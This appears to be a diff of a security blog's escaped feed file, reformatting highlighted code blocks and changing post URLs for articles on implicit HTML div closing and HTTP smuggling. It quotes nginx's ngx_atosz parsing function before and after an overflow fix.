     &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
       &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;foo
@@ -1154,7 +1574,8 @@ good.&lt;/p&gt;
       &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
       &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end third? no, end foo --&amp;gt;&lt;/span&gt;
       &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end second? no end foo&amp;#39;s parent if any --&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end foo&amp;#39;s parent&amp;#39;s parent if any --&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end foo&amp;#39;s parent&amp;#39;s parent if any --&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;Two &lt;code&gt;&amp;lt;/DIV&amp;gt;&lt;/code&gt; are &lt;strong&gt;impliclty added by the browser&lt;/strong&gt;, because you cannot close
 the &lt;code&gt;&amp;lt;LI&amp;gt;&lt;/code&gt; without closing the &lt;code&gt;&amp;lt;DIV&amp;gt;&lt;/code&gt; inside. And now, on the final page, you have
@@ -1296,7 +1717,7 @@ task, here is for example &lt;a href=&quot;https://www.drupal.org/project/wysiwy
 
 </description>
 				<published>2016-06-10 00:00:00 +0200</published>
-				<link>http://regilero.github.io/security/english/2016/06/10/security_play_with_implicit_html_and_closing_divs/</link>
+				<link>http://regilero.github.io/english/security/2016/06/10/security_play_with_implicit_html_and_closing_divs/</link>
 			</item>
 		
 			<item>
@@ -2197,7 +2618,7 @@ product you can find an excellent introduction to the HTTP protocol, with common
 pitfalls documented.&lt;/p&gt;
 </description>
 				<published>2015-10-04 00:00:00 +0200</published>
-				<link>http://regilero.github.io/security/english/2015/10/04/http_smuggling_in_2015_part_one/</link>
+				<link>http://regilero.github.io/english/security/2015/10/04/http_smuggling_in_2015_part_one/</link>
 			</item>
 		
 			<item>
@@ -2330,31 +2751,31 @@ If I remember well, the one used for the Content-Length header parsing is &lt;co
 
 &lt;p&gt;Let&#39;s analyze one of the functions before the fix:&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;
     &lt;span class=&quot;nf&quot;&gt;ngx_atosz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
+        &lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+   
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+   
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;9&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+   
+            &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+   
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+   
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;pre&gt;&lt;code&gt;    &amp;lt;span class=&quot;k&quot;&amp;gt;if&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;n&quot;&amp;gt;n&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;==&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;mi&quot;&amp;gt;0&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;)&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;{&amp;lt;/span&amp;gt;
-        &amp;lt;span class=&quot;k&quot;&amp;gt;return&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;n&quot;&amp;gt;NGX_ERROR&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt;
-    &amp;lt;span class=&quot;p&quot;&amp;gt;}&amp;lt;/span&amp;gt;
-
-    &amp;lt;span class=&quot;k&quot;&amp;gt;for&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;n&quot;&amp;gt;value&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;mi&quot;&amp;gt;0&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;n&quot;&amp;gt;n&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;o&quot;&amp;gt;--&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;n&quot;&amp;gt;line&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;o&quot;&amp;gt;++&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;)&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;{&amp;lt;/span&amp;gt;
-        &amp;lt;span class=&quot;k&quot;&amp;gt;if&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;o&quot;&amp;gt;*&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;n&quot;&amp;gt;line&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;&amp;amp;lt;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;sc&quot;&amp;gt;&amp;amp;#39;0&amp;amp;#39;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;||&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;*&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;n&quot;&amp;gt;line&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;&amp;amp;gt;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;sc&quot;&amp;gt;&amp;amp;#39;9&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;)&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;{&amp;lt;/span&amp;gt;
-            &amp;lt;span class=&quot;k&quot;&amp;gt;return&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;n&quot;&amp;gt;NGX_ERROR&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt;
-        &amp;lt;span class=&quot;p&quot;&amp;gt;}&amp;lt;/span&amp;gt;
-
-        &amp;lt;span class=&quot;n&quot;&amp;gt;value&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;n&quot;&amp;gt;value&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;*&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;mi&quot;&amp;gt;10&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;+&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;o&quot;&amp;gt;*&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;n&quot;&amp;gt;line&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;-&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;sc&quot;&amp;gt;&amp;amp;#39;0&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;);&amp;lt;/span&amp;gt;
-    &amp;lt;span class=&quot;p&quot;&amp;gt;}&amp;lt;/span&amp;gt;
-
-    &amp;lt;span class=&quot;k&quot;&amp;gt;if&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;n&quot;&amp;gt;value&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;&amp;amp;lt;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;mi&quot;&amp;gt;0&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;)&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;{&amp;lt;/span&amp;gt;
-        &amp;lt;span class=&quot;k&quot;&amp;gt;return&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;n&quot;&amp;gt;NGX_ERROR&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt;
-
-    &amp;lt;span class=&quot;p&quot;&amp;gt;}&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;k&quot;&amp;gt;else&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;{&amp;lt;/span&amp;gt;
-        &amp;lt;span class=&quot;k&quot;&amp;gt;return&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;n&quot;&amp;gt;value&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt;
-    &amp;lt;span class=&quot;p&quot;&amp;gt;}&amp;lt;/span&amp;gt;
-&amp;lt;span class=&quot;p&quot;&amp;gt;}&amp;lt;/span&amp;gt;&amp;lt;/code&amp;gt;&amp;lt;/pre&amp;gt;&amp;lt;/figure&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;The goal is to transform a text containing a number, like &quot;15&quot; to a number, 15. &lt;code&gt;line&lt;/code&gt; contains the string and &lt;code&gt;n&lt;/code&gt; is the string length. The &lt;code&gt;(*line &amp;lt; &#39;0&#39; || *line &amp;gt; &#39;9&#39;)&lt;/code&gt; test ensure each character of the line is really a digit.&lt;/p&gt;
 
@@ -2397,33 +2818,33 @@ If I remember well, the one used for the Content-Length header parsing is &lt;co
 
 &lt;p&gt;The fixed version of this same function (my own proposal was a return as soon as &lt;code&gt;value&lt;/code&gt; was lower than previous value in the for loop):&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt;
     &lt;span class=&quot;nf&quot;&gt;ngx_atosz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cutoff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cutlim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
+        &lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cutoff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cutlim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+   
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+   
+        &lt;span class=&quot;n&quot;&gt;cutoff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_MAX_SIZE_T_VALUE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;cutlim&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_MAX_SIZE_T_VALUE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+   
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;9&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cutoff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cutoff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cutlim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    
+            &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;pre&gt;&lt;code&gt;    &amp;lt;span class=&quot;k&quot;&amp;gt;if&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;n&quot;&amp;gt;n&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;==&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;mi&quot;&amp;gt;0&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;)&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;{&amp;lt;/span&amp;gt;
-        &amp;lt;span class=&quot;k&quot;&amp;gt;return&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;n&quot;&amp;gt;NGX_ERROR&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt;
-    &amp;lt;span class=&quot;p&quot;&amp;gt;}&amp;lt;/span&amp;gt;
-
-    &amp;lt;span class=&quot;n&quot;&amp;gt;cutoff&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;n&quot;&amp;gt;NGX_MAX_SIZE_T_VALUE&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;/&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;mi&quot;&amp;gt;10&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt;
-    &amp;lt;span class=&quot;n&quot;&amp;gt;cutlim&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;n&quot;&amp;gt;NGX_MAX_SIZE_T_VALUE&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;%&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;mi&quot;&amp;gt;10&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt;
-
-    &amp;lt;span class=&quot;k&quot;&amp;gt;for&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;n&quot;&amp;gt;value&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;mi&quot;&amp;gt;0&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;n&quot;&amp;gt;n&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;o&quot;&amp;gt;--&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;n&quot;&amp;gt;line&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;o&quot;&amp;gt;++&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;)&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;{&amp;lt;/span&amp;gt;
